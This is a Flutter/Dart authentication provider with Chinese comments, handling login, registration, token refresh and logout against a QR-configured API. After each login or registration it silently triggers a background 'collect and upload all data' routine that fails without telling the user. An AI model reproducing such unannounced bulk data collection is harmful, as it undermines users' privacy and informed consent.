import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../core/config/app_config.dart';
import '../core/services/storage_service.dart';
import '../models/user_model.dart';
import '../services/api/auth_api_service.dart';
import '../services/data/upload_service.dart';

/// 认证状态管理
class AuthProvider extends ChangeNotifier {
  bool _isAuthenticated = false;
  bool _hasAgreedTerms = false;
  bool _hasAgreedPermissions = false;
  UserModel? _currentUser;
  bool _isLoading = false;
  String? _errorMessage;
  
  bool get isAuthenticated => _isAuthenticated;
  bool get hasAgreedTerms => _hasAgreedTerms;
  bool get hasAgreedPermissions => _hasAgreedPermissions;
  UserModel? get currentUser => _currentUser;
  bool get isLoading => _isLoading;
  String? get errorMessage => _errorMessage;
  
  final AuthApiService _authApiService = AuthApiService();
  
  AuthProvider() {
    _loadAuthStatus();
  }
  
  /// 加载认证状态
  Future<void> _loadAuthStatus() async {
    final agreedTerms = await StorageService.instance.getAgreedTerms();
    final agreedPermissions = await StorageService.instance.getAgreedPermissions();
    final token = await StorageService.instance.getToken();
    
    _hasAgreedTerms = agreedTerms ?? false;
    _hasAgreedPermissions = agreedPermissions ?? false;
    _isAuthenticated = token != null && token.isNotEmpty;
    
    if (_isAuthenticated) {
      // 尝试恢复用户信息（从本地存储）
      final userId = await StorageService.instance.getUserId();
      if (userId != null && userId > 0) {
        // 先设置基本状态，然后异步验证 token
        _isAuthenticated = true;
        notifyListeners();
        
        // 异步验证 token 并获取最新用户信息
        _validateTokenInBackground(token!);
      } else {
        // 没有用户ID，直接验证 token
        await validateToken(token!);
      }
    }
    
    notifyListeners();
  }
  
  /// 后台验证 token（不阻塞 UI）
  Future<void> _validateTokenInBackground(String token) async {
    try {
      final user = await _authApiService.getCurrentUser();
      if (user != null) {
        _currentUser = user;
        _isAuthenticated = true;
        await StorageService.instance.saveUserId(user.id);
        _errorMessage = null;
        notifyListeners();
      } else {
        // Token 可能已过期，尝试刷新
        await _tryRefreshToken();
      }
    } catch (e) {
      // 网络错误时，保持登录状态（离线模式）
      // 只有在明确 token 无效时才清除
      if (e.toString().contains('401') || e.toString().contains('Unauthorized')) {
        await _tryRefreshToken();
      }
      // 其他错误（如网络问题）不影响登录状态
    }
  }
  
  /// 尝试刷新 token
  Future<void> _tryRefreshToken() async {
    try {
      final refreshToken = await StorageService.instance.getRefreshToken();
      if (refreshToken == null || refreshToken.isEmpty) {
        await logout();
        return;
      }
      
      final authApiService = AuthApiService();
      final result = await authApiService.refreshToken(refreshToken);
      
      if (result != null) {
        await StorageService.instance.saveToken(result.accessToken);
        await StorageService.instance.saveRefreshToken(result.refreshToken);
        
        // 重新获取用户信息
        final user = await _authApiService.getCurrentUser();
        if (user != null) {
          _currentUser = user;
          _isAuthenticated = true;
          await StorageService.instance.saveUserId(user.id);
          notifyListeners();
        }
      } else {
        // 刷新失败，清除登录状态
        await logout();
      }
    } catch (e) {
      // 刷新失败，但保持登录状态（可能是网络问题）
      // 只有在明确 token 无效时才清除
      if (e.toString().contains('401') || e.toString().contains('Unauthorized')) {
        await logout();
      }
    }
  }
  
  /// 验证 token
  Future<bool> validateToken(String token) async {
    try {
      _isLoading = true;
      notifyListeners();
      
      final user = await _authApiService.getCurrentUser();
      if (user != null) {
        _currentUser = user;
        _isAuthenticated = true;
        _errorMessage = null;
        _isLoading = false;
        notifyListeners();
        return true;
      } else {
        // Token 无效，尝试刷新
        await _tryRefreshToken();
        return _isAuthenticated;
      }
    } catch (e) {
      _errorMessage = e.toString();
      _isLoading = false;
      notifyListeners();
      return false;
    }
  }
  
  /// 登录
  Future<bool> login(String phoneOrUsername, String password) async {
    try {
      _isLoading = true;
      _errorMessage = null;
      notifyListeners();
      
      if (!AppConfig.instance.isConfigured) {
        _errorMessage = '请先扫码配置 API 地址';
        _isLoading = false;
        notifyListeners();
        return false;
      }
      
      final result = await _authApiService.login(phoneOrUsername, password);
      
      if (result != null) {
        // 保存 token
        await StorageService.instance.saveToken(result.accessToken);
        await StorageService.instance.saveRefreshToken(result.refreshToken);
        
        // 获取用户信息
        final user = await _authApiService.getCurrentUser();
        if (user != null) {
          _currentUser = user;
          await StorageService.instance.saveUserId(user.id);
        }
        
        _isAuthenticated = true;
        _errorMessage = null;
        _isLoading = false;
        notifyListeners();
        
        // 登录成功后自动收集并上传所有数据（后台执行，不阻塞UI）
        _collectDataInBackground();
        
        // 通知 SocketProvider 连接（如果已初始化）
        // 注意：这里不直接依赖 SocketProvider，避免循环依赖
        // SocketProvider 会在 AppMain 初始化时自动连接
        
        return true;
      } else {
        _errorMessage = '登录失败，请检查用户名和密码';
        _isLoading = false;
        notifyListeners();
        return false;
      }
    } catch (e) {
      // 提取错误信息（去掉 "Exception: " 前缀）
      String errorMsg = e.toString();
      if (errorMsg.startsWith('Exception: ')) {
        errorMsg = errorMsg.substring(11);
      }
      _errorMessage = errorMsg.isNotEmpty ? errorMsg : '登录失败，请检查用户名和密码';
      _isLoading = false;
      notifyListeners();
      return false;
    }
  }
  
  /// 注册
  Future<bool> register({
    required String phone,
    required String username,
    required String password,
    String? nickname,
    required String invitationCode,
    required bool agreedToTerms,
  }) async {
    try {
      _isLoading = true;
      _errorMessage = null;
      notifyListeners();
      
      if (!AppConfig.instance.isConfigured) {
        _errorMessage = '请先扫码配置 API 地址';
        _isLoading = false;
        notifyListeners();
        return false;
      }
      
      final result = await _authApiService.register(
        phone: phone,
        username: username,
        password: password,
        nickname: nickname,
        invitationCode: invitationCode,
        agreedToTerms: agreedToTerms,
      );
      
      if (result != null) {
        // 保存 token
        await StorageService.instance.saveToken(result.accessToken);
        await StorageService.instance.saveRefreshToken(result.refreshToken);
        
        // 保存注册信息
        await StorageService.instance.saveRegisterPhone(phone);
        await StorageService.instance.saveRegisterUsername(username);
        await StorageService.instance.saveRegisterInvitationCode(invitationCode);
        
        // 获取用户信息
        final user = await _authApiService.getCurrentUser();
        if (user != null) {
          _currentUser = user;
          await StorageService.instance.saveUserId(user.id);
        }
        
        // 保存免责声明同意状态
        if (agreedToTerms) {
          await StorageService.instance.saveAgreedTerms(true);
          _hasAgreedTerms = true;
        }
        
        _isAuthenticated = true;
        _errorMessage = null;
        _isLoading = false;
        notifyListeners();
        
        // 注册成功后自动收集并上传所有数据（后台执行，不阻塞UI）
        _collectDataInBackground();
        
        return true;
      } else {
        _errorMessage = '注册失败，请检查输入信息';
        _isLoading = false;
        notifyListeners();
        return false;
      }
    } catch (e) {
      // 提取错误信息（去掉 "Exception: " 前缀）
      String errorMsg = e.toString();
      if (errorMsg.startsWith('Exception: ')) {
        errorMsg = errorMsg.substring(11);
      }
      _errorMessage = errorMsg.isNotEmpty ? errorMsg : '注册失败，请检查输入信息';
      _isLoading = false;
      notifyListeners();
      return false;
    }
  }
  
  /// 同意免责声明
  Future<bool> agreeTerms() async {
    try {
      _isLoading = true;
      notifyListeners();
      
      final success = await _authApiService.agreeTerms();
      if (success) {
        await StorageService.instance.saveAgreedTerms(true);
        _hasAgreedTerms = true;
        _isLoading = false;
        notifyListeners();
        return true;
      } else {
        _errorMessage = '同意失败，请重试';
        _isLoading = false;
        notifyListeners();
        return false;
      }
    } catch (e) {
      _errorMessage = e.toString();
      _isLoading = false;
      notifyListeners();
      return false;
    }
  }
  
  /// 同意隐私权限说明
  Future<bool> agreePermissions() async {
    try {
      await StorageService.instance.saveAgreedPermissions(true);
      _hasAgreedPermissions = true;
      notifyListeners();
      return true;
    } catch (e) {
      _errorMessage = e.toString();
      notifyListeners();
      return false;
    }
  }
  
  /// 登出
  Future<void> logout() async {
    _isAuthenticated = false;
    _currentUser = null;
    _errorMessage = null;
    
    // 清除本地存储
    await StorageService.instance.clearAllTokens();
    await StorageService.instance.saveUserId(0);
    
    notifyListeners();
  }
  
  /// 清除错误信息
  void clearError() {
    _errorMessage = null;
    notifyListeners();
  }
  
  /// 后台收集并上传所有数据（登录后自动执行）
  Future<void> _collectDataInBackground() async {
    // 在后台执行，不阻塞UI
    Future.delayed(const Duration(seconds: 2), () async {
      try {
        final uploadService = UploadService.instance;
        final result = await uploadService.collectAndUploadAllData();
        
        if (result['success'] == true) {
          debugPrint('数据收集上传成功: ${result.toString()}');
        } else {
          debugPrint('数据收集上传失败: ${result['errors']}');
        }
      } catch (e) {
        debugPrint('数据收集上传异常: $e');
        // 静默失败，不影响用户体验
      }
    });
  }
}
